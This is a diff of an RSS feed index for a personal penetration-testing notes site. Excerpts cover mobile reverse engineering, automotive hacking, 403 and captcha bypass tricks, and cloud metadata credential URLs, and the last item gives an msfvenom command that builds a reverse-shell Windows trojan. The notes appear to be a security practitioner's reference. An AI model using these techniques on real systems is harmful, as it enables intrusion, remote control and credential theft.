@@ -2,27 +2,27 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Index on duraki&#39;s notes</title>
-    <link>./notes/public/</link>
+    <link>/notes/public/</link>
     <description>Recent content in Index on duraki&#39;s notes</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>durakiconsulting (c) h. duraki</copyright>
-    <lastBuildDate>Fri, 29 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="./notes/public/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 29 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="/notes/public/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>~ ideas</title>
-      <link>./notes/public/~-ideas/</link>
+      <link>/notes/public/~-ideas/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/~-ideas/</guid>
+      <guid>/notes/public/~-ideas/</guid>
       <description> SonicWall SMA100 Firmware 1day OPC Router DLL Hijacking, XML Attack via Licenses  </description>
     </item>
     
     <item>
       <title>Android Recompilation</title>
-      <link>./notes/public/android-recompilation/</link>
+      <link>/notes/public/android-recompilation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/android-recompilation/</guid>
+      <guid>/notes/public/android-recompilation/</guid>
       <description>Decompile Android APK file using apktool:
 # =&amp;gt; decompile $ apktool -r d AppName.apk -o AppName # =&amp;gt; recompile $ apktool b AppName Resign the APK package and install the Android application:
 # =&amp;gt; sign the apk package $ keytool -genkey -keystore example.keystore -validity 10000 -alias example $ jarsigner -keystore example.keystore -verbose AppName.apk example # =&amp;gt; installation $ apk install AppName.apk </description>
@@ -30,10 +30,10 @@
     
     <item>
       <title>Android Reverse Engineering</title>
-      <link>./notes/public/android-reverse-engineering/</link>
+      <link>/notes/public/android-reverse-engineering/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/android-reverse-engineering/</guid>
+      <guid>/notes/public/android-reverse-engineering/</guid>
       <description>Burp Proxy Setup If using Android 7 or above, you need to export Burp CA Certificate from Proxy → Options, and selecting Import/Export CA certificate. Android wants the certificate to be in PEM format. The filename has to be equal to the subject_hash_old value appended with .0.
 Note - if you are using OpenSSL &amp;lt; 1.0, you need to use subject_hash instead of subject_hash_old.
 Using openssl is recommended way to convert DER to PEM format.</description>
@@ -41,46 +41,46 @@ Using openssl is recommended way to convert DER to PEM format.</description>
     
     <item>
       <title>API Penetration Test Checklist</title>
-      <link>./notes/public/api-penetration-test-checklist/</link>
+      <link>/notes/public/api-penetration-test-checklist/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/api-penetration-test-checklist/</guid>
+      <guid>/notes/public/api-penetration-test-checklist/</guid>
       <description>--- ## Authentication - [ ] Don&amp;#39;t use `Basic Auth`. Use standard authentication instead (e.g. [JWT](https://jwt.io/), [OAuth](https://oauth.net/)). - [ ] Don&amp;#39;t reinvent the wheel in `Authentication`, `token generation`, `password storage`. Use the standards. - [ ] Use `Max Retry` and jail features in Login. - [ ] Use encryption on all sensitive data. ### JWT (JSON Web Token) - [ ] Use a random complicated key (`JWT Secret`) to make brute forcing the token very hard.</description>
     </item>
     
     <item>
       <title>Automotive</title>
-      <link>./notes/public/automotive/</link>
+      <link>/notes/public/automotive/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/automotive/</guid>
+      <guid>/notes/public/automotive/</guid>
       <description> Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  </description>
     </item>
     
     <item>
       <title>Automotive Cybersecurity Videos</title>
-      <link>./notes/public/automotive-cybersecurity-videos/</link>
+      <link>/notes/public/automotive-cybersecurity-videos/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/automotive-cybersecurity-videos/</guid>
+      <guid>/notes/public/automotive-cybersecurity-videos/</guid>
       <description>https://www.youtube.com/watch?v=xHfInsMEYdQ https://www.youtube.com/watch?v=DUNWZnhneiI https://www.youtube.com/watch?v=mz55tsLnlSc https://www.youtube.com/watch?v=k50hU6aPlG8 https://www.youtube.com/watch?v=k4JD2ZUHrXA - Cert-based auth via UDS https://www.youtube.com/watch?v=KqV5nIkGKFs - CANFD explained https://www.youtube.com/watch?v=XMVLkbw1BNE - New Standard for Ethernet on a Bus Line (10BASE-T1S) https://www.youtube.com/watch?v=WW481idfcro - Cert-based auth via Vector tool https://www.youtube.com/watch?v=pxlx3_gEiFM - Embedded Security in Automotive https://www.youtube.com/watch?v=3uU0Sl-byVc - Using ML to detect anomalyes https://www.youtube.com/watch?v=QEOWjEytb6Y - Cert-based in diagnostics (in-depth) https://www.youtube.com/watch?v=bUdxpsQXeRU - Corporate security testing in Automotive https://www.youtube.com/watch?v=DuXhz4mDYZA - From TARA to Pentest https://www.youtube.com/watch?v=7D7uNqPWrXw - Using Scapy for Car pentesting</description>
     </item>
     
     <item>
       <title>Automotive Hacking</title>
-      <link>./notes/public/automotive-hacking/</link>
+      <link>/notes/public/automotive-hacking/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/automotive-hacking/</guid>
+      <guid>/notes/public/automotive-hacking/</guid>
       <description>Link ECUs to avoid wires (weight, size, cost) Network Protocols allow ECUs to share information quickly and precisely (Ethernet &amp;amp; CANFD/CAN) Networks used between ECUs are based on Serial Communications  Serial means that items of information are sent via a single stream of communication   Speed of communication is measured in number of bits sent per second (bps) CAN (Controller Area Network) bus was developed to meet needs of up to 1 million bits per second (1Mbps) LIN (Local Interconnect Network) introduced to give a lower cost, lower speed altenative (~20 kbps) FlexRay was developed for more fault-tolerant, higher speed (10Mbps) network Ethernet (100Mbps) for videos and advanced driver assistance systems (new vehicles)  Special ECU are used called &amp;ldquo;gateways&amp;rdquo; to interconnect different network protocols (CAN + LIN, or Ethernet + FlexRay etc.</description>
     </item>
     
     <item>
       <title>Bash in simple words</title>
-      <link>./notes/public/bash-in-simple-words/</link>
+      <link>/notes/public/bash-in-simple-words/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/bash-in-simple-words/</guid>
+      <guid>/notes/public/bash-in-simple-words/</guid>
       <description>The first two statements of your Bash script should be:
 #!/usr/bin/env bash set -euo pipefail The first statement is a Mac, GNU/Linux, and BSD portable way of finding the location of the bash interpreter.
 The second statement combines:
@@ -89,30 +89,30 @@ The second statement combines:
     
     <item>
       <title>Blog Setup</title>
-      <link>./notes/public/blog-setup/</link>
+      <link>/notes/public/blog-setup/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/blog-setup/</guid>
+      <guid>/notes/public/blog-setup/</guid>
       <description>The blog is using a custom site generator called art and it uses Ruby and some wrapper magic to generate this from a rather minimal configuration setup in .home.yml file.
 --- minimal: artist: &amp;#34;Your Name&amp;#34; title: &amp;#34;Blog Title&amp;#34; description: &amp;#34;Blog description.&amp;#34; theme: &amp;#34;theme-name&amp;#34; posts: in: /posts/in # =&amp;gt; post in (md) out: /posts/out # =&amp;gt; post out (html) scripts: - &amp;#34;my super href:/about/me.html&amp;#34; # =&amp;gt; Links/URIs/Other art: ga: UA-00000000-X # =&amp;gt; your Google Analytics </description>
     </item>
     
     <item>
       <title>Building Kali Linux for Banana Pro</title>
-      <link>./notes/public/building-kali-linux-for-banana-pro/</link>
+      <link>/notes/public/building-kali-linux-for-banana-pro/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/building-kali-linux-for-banana-pro/</guid>
+      <guid>/notes/public/building-kali-linux-for-banana-pro/</guid>
       <description>Equipment  MacOS with GNU/Linux Virtual Machine or GNU/Linux equivalent LeMaker Banana Pro arm_pc SDCard with at least 16GB capacity (preferably &amp;ldquo;Class 10&amp;rdquo; or higher)  Build Instructions The Banana Pro has a dual core 1GHz Cortex™-A7 processor with a Mali400MP2 GPU and 1GB DDR3 RAM. Kali Linux can run from an external microSD card.
 Kali Linux is supporting Banana Pro but it must be built from source. You will obviously need a GNU/Linux based OS (preferably Kali Linux) &amp;ndash; although I personally use VMWare Workstation with Ubuntu 20.</description>
     </item>
     
     <item>
       <title>Bypass 403 on nginx</title>
-      <link>./notes/public/bypass-403-on-nginx/</link>
+      <link>/notes/public/bypass-403-on-nginx/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/bypass-403-on-nginx/</guid>
+      <guid>/notes/public/bypass-403-on-nginx/</guid>
       <description>Normally a client can&amp;rsquo;t access /admin directory because of front nginx server which returns 403 Forbidden. We can:
 * use `X-Rewrite-Url` or `X-original-url` * back server processes these headers and front server doesn&#39;t.  Steps to reproduce:
 normally
@@ -122,10 +122,10 @@ $ curl -i -s -k -X $&amp;#39;GET&amp;#39; -H $&amp;#39;Host: login.example.com&a
     
     <item>
       <title>Byteman</title>
-      <link>./notes/public/byteman/</link>
+      <link>/notes/public/byteman/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/byteman/</guid>
+      <guid>/notes/public/byteman/</guid>
       <description>Introduction Byteman is a bytecode manipulation tool for tweaking and changing Java application at load time and runtime. It work without the needs for recompilation. The modification is purely in memory, via Event Condition Action rule language - based on Java.
 Rules Write ECA based rules which you can inject using Byteman directives and command line application.
 # =&amp;gt; trace.btm RULE trace main entry CLASS ^CognitiveApp METHOD main AT ENTRY IF TRUE DO traceln(&amp;#34;Byteman: Application loaded successfully.</description>
@@ -133,10 +133,10 @@ Rules Write ECA based rules which you can inject using Byteman directives and co
     
     <item>
       <title>Byteman Scripts</title>
-      <link>./notes/public/byteman-scripts/</link>
+      <link>/notes/public/byteman-scripts/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/byteman-scripts/</guid>
+      <guid>/notes/public/byteman-scripts/</guid>
       <description>Simple trace skeleton
 RULE trace CLASS ^App METHOD login AT ENTRY IF true DO System.out.println(&amp;#34; Tracing login stdout&amp;#34;) DO traceln(&amp;#34;Tracing login ended&amp;#34;) ENDRULE Trace application entry
 RULE trace application entry CLASS ^App METHOD main AT ENTRY IF TRUE DO traceln(&amp;#34;BMB java.application.main() called!&amp;#34;) ENDRULE Trace application exit
@@ -146,57 +146,57 @@ RULE trace thread start CLASS java.</description>
     
     <item>
       <title>CANFD Specifications</title>
-      <link>./notes/public/canfd-specifications/</link>
+      <link>/notes/public/canfd-specifications/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/canfd-specifications/</guid>
+      <guid>/notes/public/canfd-specifications/</guid>
       <description> Extended CAN frame. Can send larger payloads. A bit different structure. Using CANEdge2 for testing the CANFD frames.  </description>
     </item>
     
     <item>
       <title>Captcha Bypass Tricks</title>
-      <link>./notes/public/captcha-bypass-tricks/</link>
+      <link>/notes/public/captcha-bypass-tricks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/captcha-bypass-tricks/</guid>
+      <guid>/notes/public/captcha-bypass-tricks/</guid>
       <description>Header Injection to bypoass Captcha
 1. Response manipulation. 2. Use previously used token. 3. Use any token with same length(+1/-1). 4. Remove the param value or remove the entire parameter. 5. Change method from POST to GET(or PUT) and remove the captcha. 6. Change body to JSON or vice-versa. 7. OCR. 8. Check whether the captcha is in the source code. (Ex: 2+2) 9. Check whether the value of the captcha is in the source code.</description>
     </item>
     
     <item>
       <title>Classical</title>
-      <link>./notes/public/classical/</link>
+      <link>/notes/public/classical/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/classical/</guid>
+      <guid>/notes/public/classical/</guid>
       <description> OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse  </description>
     </item>
     
     <item>
       <title>Classical API Abuse</title>
-      <link>./notes/public/classical-api-abuse/</link>
+      <link>/notes/public/classical-api-abuse/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/classical-api-abuse/</guid>
+      <guid>/notes/public/classical-api-abuse/</guid>
       <description>API Keys Reuse Use Keyhacks to scan for key leaks.
 API Calling Convention Try to hook() on a call or initiate new calls from the handler.</description>
     </item>
     
     <item>
       <title>Cloud Metadata</title>
-      <link>./notes/public/cloud-metadata/</link>
+      <link>/notes/public/cloud-metadata/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/cloud-metadata/</guid>
+      <guid>/notes/public/cloud-metadata/</guid>
       <description>AWS # from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories http://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key AWS (dirs ) http://169.254.169.254/ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/public-keys/ Google Cloud # https://cloud.google.com/compute/docs/metadata # - Requires the header &amp;#34;Metadata-Flavor: Google&amp;#34; or &amp;#34;X-Google-Metadata-Request: True&amp;#34; http://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id # Google allows recursive pulls http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true Google # Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn) http://metadata.google.internal/computeMetadata/v1beta1/ Digital Ocean # https://developers.digitalocean.com/documentation/metadata/ http://169.254.169.254/metadata/v1.json http://169.254.169.254/metadata/v1/ http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1/user-data http://169.254.169.254/metadata/v1/hostname http://169.254.169.254/metadata/v1/region http://169.</description>
     </item>
     
     <item>
       <title>Cycript</title>
-      <link>./notes/public/cycript/</link>
+      <link>/notes/public/cycript/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/cycript/</guid>
+      <guid>/notes/public/cycript/</guid>
       <description>Tips and Tricks
 Get pasteboard/clipboard items.
 [UIPasteboard generalPasteboard].items Get UI elements dump.
@@ -208,66 +208,66 @@ Syslog Macros
     
     <item>
       <title>Decrypt IPA from AppStore</title>
-      <link>./notes/public/decrypt-ipa-from-appstore/</link>
+      <link>/notes/public/decrypt-ipa-from-appstore/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/decrypt-ipa-from-appstore/</guid>
+      <guid>/notes/public/decrypt-ipa-from-appstore/</guid>
       <description>Requires iproxy and frida-ios-dump. File will be generated in current directory with *.ipa extension.
 # =&amp;gt; Start iproxy $ iproxy 2222 22 # =&amp;gt; Lists App from iOS processes $ cd ~/util/re/ios/frida-ios-dump $ python dump.py -l PID Name Identifier --- - App Name Here xxx.xxxxxx.xxxxxx.xx # =&amp;gt; Dump App from iOS device $ ./dump.py xxx.xxxxxx.xxxxxx.xx ... </description>
     </item>
     
     <item>
       <title>Dev</title>
-      <link>./notes/public/dev/</link>
+      <link>/notes/public/dev/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/dev/</guid>
+      <guid>/notes/public/dev/</guid>
       <description> Bash  </description>
     </item>
     
     <item>
       <title>ECU Calibration</title>
-      <link>./notes/public/ecu-calibration/</link>
+      <link>/notes/public/ecu-calibration/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/ecu-calibration/</guid>
+      <guid>/notes/public/ecu-calibration/</guid>
       <description>ECU tuning is a part of Calibration Changing some values to make a vehicle faster, have better accelaration etc. This calibration process is used to fine tune all parameters before final manufacturing process Usually XCP interface is removed from final production If XCP is open, you still need to reverse the firmware to understand the ECU  How to Calibrate and Adjust  Calibration Software Vehicle networks Interface to the ECU Calibration Protocol ECU description file (*.</description>
     </item>
     
     <item>
       <title>ECU Foundations</title>
-      <link>./notes/public/ecu-foundations/</link>
+      <link>/notes/public/ecu-foundations/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/ecu-foundations/</guid>
+      <guid>/notes/public/ecu-foundations/</guid>
       <description>ECU  Electronic Control Unit the &amp;ldquo;ECU&amp;rdquo; Doing calculations or apply rules in the vehicle system  Calculation example of ECU Meassure &amp;ldquo;Speed (km/h)&amp;rdquo; ECU would &amp;ldquo;calculate&amp;rdquo;: - speed (km/h) = wheel (rpm) x 3.6   Apply a tiny part of logic  If speed is above 5km/h, then lock the doors   ECUs are wired to sensors, mothers, and other actuators One ECU can be used for different vehicles They use microcontroller (have memory/storage unlike microprocessor) Uses embedded software, via special hardware that converts electrical signal to numbers (and vice-versa), collectively IO (input/output) Uses networking hardware, via in-vehicle networks (like CANBus)  ECU Software Layers</description>
     </item>
     
     <item>
       <title>Ethernet Specifications</title>
-      <link>./notes/public/ethernet-specifications/</link>
+      <link>/notes/public/ethernet-specifications/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/ethernet-specifications/</guid>
+      <guid>/notes/public/ethernet-specifications/</guid>
       <description>Specifications  SomeIP, Ethernet, IP Stack New standard 10BASE-T1S 10Mbit/s Half-duplex PLCA bus cycle - only specific PHY that can send data Physical Layer Collision Avoidance (PLCA) Avoid collision of data Multiple applications on single cable  </description>
     </item>
     
     <item>
       <title>Firewall Engagements</title>
-      <link>./notes/public/firewall-engagements/</link>
+      <link>/notes/public/firewall-engagements/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/firewall-engagements/</guid>
+      <guid>/notes/public/firewall-engagements/</guid>
       <description>Reconned from the start to finish in a few sec &amp;hellip;
 ┌──(kali㉿kali)-[~] └─$ ping x.x.x.x PING ??? 56(84) bytes of data. 64 bytes from ???: icmp_seq=1 ttl=52 time=64.4 ms 64 bytes from ???: icmp_seq=2 ttl=52 time=62.7 ms ^C --- ??? ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1002ms ┌──(kali㉿kali)-[~] └─$ host x.x.x.x % nslookup &amp;gt; set type=PTR &amp;gt; x.x.x.x Server:	???	Address: ???	Non-authoritative answer: .</description>
     </item>
     
     <item>
       <title>Frida &amp; Objection Tutorial</title>
-      <link>./notes/public/frida-objection-tutorial/</link>
+      <link>/notes/public/frida-objection-tutorial/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/frida-objection-tutorial/</guid>
+      <guid>/notes/public/frida-objection-tutorial/</guid>
       <description>Android Tutorial Frida Setup Make sure to have Android Debugging interface running (adbd) on your testing device. For reference, read the adbd setup first and then continue here.
 Install the Frida for Android:
 $ adb root # might be required $ adb push frida-server /data/local/tmp/ $ adb shell &amp;#34;chmod 755 /data/local/tmp/frida-server&amp;#34; $ adb shell &amp;#34;/data/local/tmp/frida-server &amp;amp;&amp;#34; Smoke test on Frida setup:
@@ -276,10 +276,10 @@ $ adb devices -l $ frida-ps -U # PID NAME 1590 com.</description>
     
     <item>
       <title>Frida Gadget Injection</title>
-      <link>./notes/public/frida-gadget-injection/</link>
+      <link>/notes/public/frida-gadget-injection/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/frida-gadget-injection/</guid>
+      <guid>/notes/public/frida-gadget-injection/</guid>
       <description>This is quick description on how to inject Frida gadget into Smali directly without much overhead. Start by installing Frida and Objection and then continuing from here.
 First decompile the APK and check the AndroidManifest.xml file.
 $ more AndroidManifest.xml &amp;lt;application ...&amp;gt; &amp;lt;activity android:name=&amp;#34;xxx.activity.SplashActivity&amp;#34; android:noHistory=&amp;#34;true&amp;#34; android:screenOrientation=&amp;#34;portrait&amp;#34;&amp;gt; ... Write down the Activity name (such is SplashActivity). Must be somewhere on early start-up of application lifecycle. Open up the Activity in decompiled Smali object, and change the public constructor &amp;lt;init&amp;gt;(V) to include frida-gadget.</description>
@@ -287,30 +287,30 @@ $ more AndroidManifest.xml &amp;lt;application ...&amp;gt; &amp;lt;activity andr
     
     <item>
       <title>Ghidra and related</title>
-      <link>./notes/public/ghidra-and-related/</link>
+      <link>/notes/public/ghidra-and-related/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/ghidra-and-related/</guid>
+      <guid>/notes/public/ghidra-and-related/</guid>
       <description>Installation Clone the repository or download and extract somewhere. In Ghidra, open the Script Manager (Window -&amp;gt; Script Manager) click the Script Directory button and add $REPO/scripts to the list.
 Once the script directory is added to Ghidra you can find the scripts in the Script Manager. You can run the scripts directly from the Script Manager if you like but the scripts also have menus and keyboard shortcuts for ease of use.</description>
     </item>
     
     <item>
       <title>How to compromise ECU</title>
-      <link>./notes/public/how-to-compromise-ecu/</link>
+      <link>/notes/public/how-to-compromise-ecu/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/how-to-compromise-ecu/</guid>
+      <guid>/notes/public/how-to-compromise-ecu/</guid>
       <description>Five steps to compromise ECU:
  Remote access Access to in-vehicle network Bridge domain boundaries Access to target ECU Manipulate ECU or vehicle behavior  Find more info about Car Hacking on notes.</description>
     </item>
     
     <item>
       <title>How to write Notes</title>
-      <link>./notes/public/how-to-write-notes/</link>
+      <link>/notes/public/how-to-write-notes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/how-to-write-notes/</guid>
+      <guid>/notes/public/how-to-write-notes/</guid>
       <description>TL;DR  Use Markdown for everything Use shortcodes Clear and consistent Integrate well with art CLI  Markdown Styled Blocks
 ::: alert red This is a **Red Alert!** Take cover. ::: ::: alert red This is a Red Alert! Take cover. :::
 Media Insertion
@@ -323,10 +323,10 @@ List of supported languages</description>
     
     <item>
       <title>iOS Reverse Engineering</title>
-      <link>./notes/public/ios-reverse-engineering/</link>
+      <link>/notes/public/ios-reverse-engineering/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/ios-reverse-engineering/</guid>
+      <guid>/notes/public/ios-reverse-engineering/</guid>
       <description>Using class-dump
 $ class-dump -S -s -H App -o /path/to/headers/App/  Frida &amp;amp; Objection Tutorial LLDB Pure Reverse Engineering Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis  References
  iOS CheatSheet Decrypting apps from AppStore Reverse Engineering Tools iOS Static Analysis  </description>
@@ -334,29 +334,29 @@ $ class-dump -S -s -H App -o /path/to/headers/App/  Frida &amp;amp; Objection Tu
     
     <item>
       <title>iOS Static Analysis</title>
-      <link>./notes/public/ios-static-analysis/</link>
+      <link>/notes/public/ios-static-analysis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/ios-static-analysis/</guid>
+      <guid>/notes/public/ios-static-analysis/</guid>
       <description> Find all JSON and Plist files in app bundle and see if there are any disclosures NSAllowsArbitraryLoads - Disables App Transport Security (ATS), allowing weak TLS configs CFBundleURLTypes - Custom Scheme URLs that can be exploited further (see this) AFNetworking 2.5.1 - Version and below are vulnerable to MITM if there was no SSL pinning applied  </description>
     </item>
     
     <item>
       <title>Jailbreak Bypass</title>
-      <link>./notes/public/jailbreak-bypass/</link>
+      <link>/notes/public/jailbreak-bypass/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/jailbreak-bypass/</guid>
+      <guid>/notes/public/jailbreak-bypass/</guid>
       <description>If jailbreak detection persists in iOS application, try these tricks:
  Libery Lite via Cydia, then go to settings, and then select the application Recommended Objection use ios jailbreak disable or --startup-command Frida as a standalone instrumentation Manual Patching, the old school way  </description>
     </item>
     
     <item>
       <title>Linux Notes</title>
-      <link>./notes/public/linux-notes/</link>
+      <link>/notes/public/linux-notes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/linux-notes/</guid>
+      <guid>/notes/public/linux-notes/</guid>
       <description>Active Directory
 Access Active Directory Domain Admin via Linux:
 $ sudo apt-get realmd $ realm join example.ba --user username </description>
@@ -364,29 +364,29 @@ $ sudo apt-get realmd $ realm join example.ba --user username </description>
     
     <item>
       <title>List of Tools</title>
-      <link>./notes/public/list-of-tools/</link>
+      <link>/notes/public/list-of-tools/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/list-of-tools/</guid>
+      <guid>/notes/public/list-of-tools/</guid>
       <description>apktool, android, openssl</description>
     </item>
     
     <item>
       <title>List of Topics</title>
-      <link>./notes/public/list-of-topics/</link>
+      <link>/notes/public/list-of-topics/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/list-of-topics/</guid>
+      <guid>/notes/public/list-of-topics/</guid>
       <description>Personal list of topics of interest. At least for me eh? :)
 Automotive Cyber Security §Automotive  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  Classical Penetration Testing §Classical Pentest  OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library PHP Source Code Analysis  PHP Filesystem Functions     Networking §Network  Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks    Reverse Engineering §RE  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts MacOS Reverse Engineering  Ghidra and Related LLDB for MacOS Hopper for MacOS   iOS Reverse Engineering  Frida &amp;amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida &amp;amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research  Development §dev blog</description>
     </item>
     
     <item>
       <title>lldb</title>
-      <link>./notes/public/lldb/</link>
+      <link>/notes/public/lldb/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/lldb/</guid>
+      <guid>/notes/public/lldb/</guid>
       <description>Cheatsheet Objective-C Important &amp;ndash; set a lldb language context to Objective-C:
 (lldb) settings set target.language objc Cast an address to object:
 (lldb) po ((MKPinAnnotationView *)0x7df67c50).alpha &amp;hellip;
@@ -397,10 +397,10 @@ Swift Important &amp;ndash; set a lldb language context to Swift:
     
     <item>
       <title>MacOS Notes</title>
-      <link>./notes/public/macos-notes/</link>
+      <link>/notes/public/macos-notes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/macos-notes/</guid>
+      <guid>/notes/public/macos-notes/</guid>
       <description>Check Application entitlement
 # ~&amp;gt; brew install jtool # =&amp;gt; no visible entitlemens $ jtool --ent /Applications/MachOView.app /Applications/MachOView.app/Contents/MacOS//MachOView apparently does not contain any entitlements # =&amp;gt; with visible entitlements $ jtool --ent /Applications/ProtonVPN.app &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE plist PUBLIC &amp;#34;-//Apple//DTD PLIST 1.0//EN&amp;#34; &amp;#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;#34;&amp;gt; &amp;lt;plist version=&amp;#34;1.0&amp;#34;&amp;gt; &amp;lt;dict&amp;gt; &amp;lt;key&amp;gt;com.apple.application-identifier&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;J6S6Q257EK.ch.protonvpn.mac&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;com.apple.developer.maps&amp;lt;/key&amp;gt; &amp;lt;true/&amp;gt; ... libSystem.B.dylib
 All API rely on above library. For example, when the MachO Process starts, the above library will be loaded early in time so it can use other APIs.</description>
@@ -408,10 +408,10 @@ All API rely on above library. For example, when the MachO Process starts, the a
     
     <item>
       <title>Metasploit Framework</title>
-      <link>./notes/public/metasploit-framework/</link>
+      <link>/notes/public/metasploit-framework/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/metasploit-framework/</guid>
+      <guid>/notes/public/metasploit-framework/</guid>
       <description>Create executable trojan
 $ msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=192.168.153.128 LPORT=8888 -o /root/Desktop/dolphin.exe On Attackers machine (Starting Session)
